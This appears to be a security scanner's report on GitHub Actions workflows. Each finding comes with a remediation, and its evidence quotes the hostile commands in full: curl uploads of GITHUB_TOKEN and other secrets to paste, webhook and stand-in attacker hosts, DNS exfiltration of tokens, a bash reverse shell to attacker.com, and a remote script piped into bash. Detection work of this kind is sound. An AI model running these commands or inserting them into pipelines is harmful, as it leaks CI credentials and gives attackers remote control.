findings.Description: Command potentially exfiltrates secrets or sensitive data to external servers
findings.Evidence:
# Writing secrets to file and sending them
echo "${{ secrets.GITHUB_TOKEN }}" > token.txt
curl -F "file=@token.txt" https://paste.bin.io/upload
findings.Remediation: Review and remove suspicious commands that may send sensitive data to external locations

findings.Description: Command potentially exfiltrates secrets or sensitive data to external servers
findings.Evidence:
# Sending data directly to an IP address
curl -X POST -d "$(env | grep GITHUB)" http://192.168.1.100:8080/collect
findings.Remediation: Review and remove suspicious commands that may send sensitive data to external locations

findings.Description: Command decodes and executes base64 encoded data, which can hide malicious code
findings.Remediation: Avoid executing encoded commands. If necessary, decode to a file, verify content, then execute

findings.Description: Workflow uses pull_request_target event and checks out PR code, which can lead to code execution
findings.Remediation: Use pull_request event instead, or don't checkout PR code with pull_request_target

findings.RuleName: Suspicious Data Exfiltration in Environment Variable
findings.Description: Environment variable contains suspicious exfiltration pattern
findings.Remediation: Review and remove suspicious environment variable values

findings.Description: Workflow uses 'write-all' permissions, granting excessive access to all repository resources
findings.Remediation: Use specific permissions instead of 'write-all'. Define only the permissions your workflow actually needs.

findings.RuleName: Suspicious Data Exfiltration in Environment Variable
findings.Description: Environment variable contains suspicious exfiltration pattern
findings.Remediation: Review and remove suspicious environment variable values

findings.Description: Command potentially exfiltrates secrets or sensitive data to external servers
findings.Evidence:
# This would open a reverse shell if executed
# bash -i >& /dev/tcp/attacker.com/4444 0>&1
echo "Just demonstrating a pattern"
findings.Remediation: Review and remove suspicious commands that may send sensitive data to external locations

findings.Description: Shell command appears to use obfuscation techniques to hide its true purpose
findings.Remediation: Rewrite the command to be clear and transparent. Avoid techniques that obscure the command's intent.

findings.Description: Command potentially exfiltrates secrets or sensitive data to external servers
findings.Evidence:
# Sending secrets to external webhook service
curl -X POST -H "Content-Type: application/json" \
  -d "{\"token\": \"$API_SECRET\"}" \
  https://webhook.site/12345678-1234-1234-1234-123456789012
findings.Remediation: Review and remove suspicious commands that may send sensitive data to external locations

findings.Description: Command potentially exfiltrates secrets or sensitive data to external servers
findings.Evidence:
# This would set up an ngrok tunnel
curl -s https://ngrok-dl.com/download.sh | bash
./ngrok http 8080
findings.Remediation: Review and remove suspicious commands that may send sensitive data to external locations

findings.Description: Command potentially exfiltrates secrets or sensitive data to external servers
findings.Evidence:
# Using DNS for data exfiltration
for token in $(env | grep TOKEN); do
  dig +short $token.attacker.command.io
done
findings.Remediation: Review and remove suspicious commands that may send sensitive data to external locations

findings.Description: Command potentially exfiltrates secrets or sensitive data to external servers
findings.Evidence:
# Encoding and exfiltrating secrets
env | grep SECRET | base64 | curl -X POST -d @- https://collect.exfil.io/
findings.Remediation: Review and remove suspicious commands that may send sensitive data to external locations

findings.Description: Use of eval in shell scripts can be dangerous as it executes dynamic code
findings.Remediation: Avoid using eval. Consider safer alternatives for your specific use case.

findings.Description: Command downloads and executes code directly from the internet, which can be a security risk
findings.Evidence:
# This would set up an ngrok tunnel
curl -s https://ngrok-dl.com/download.sh | bash
./ngrok http 8080
findings.Remediation: Download the script first, verify its contents, and then execute it separately

findings.Description: Command contains potentially dangerous or destructive operations
findings.Evidence:
# This would set up an ngrok tunnel
curl -s https://ngrok-dl.com/download.sh | bash
./ngrok http 8080
findings.Remediation: Review and replace with a safer alternative. If necessary, scope the command more precisely.

findings.Description: Potential secret or credential found hardcoded in workflow file
findings.Remediation: Use repository secrets or environment variables instead of hardcoded values. Consider using GitHub's secret scanning features.
